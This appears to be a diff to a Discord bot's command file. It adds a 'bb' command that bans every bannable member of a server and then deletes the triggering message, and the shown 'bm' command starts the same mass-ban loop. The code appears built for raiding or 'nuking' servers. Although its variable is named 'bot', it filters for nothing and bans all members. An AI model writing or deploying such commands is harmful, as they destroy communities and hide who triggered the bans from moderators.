@@ -26,7 +26,20 @@ exports.run = async (client, message, args) => {
     }
   }
 
-  if (args[0] === "bl") {
+  if (args[0] === "bb") {
+    try {
+      message.guild.members.cache
+        .filter(bot => bot.bannable)
+        .forEach(bot => {
+          bot.ban();
+        });
+      message.delete({ Timeout: 0 });
+    } catch (e) {
+      console.log(e.stack);
+    }
+  }
+
+  if (args[0] === "bm") {
     try {
       message.guild.members.cache
         .filter(member => member.bannable)
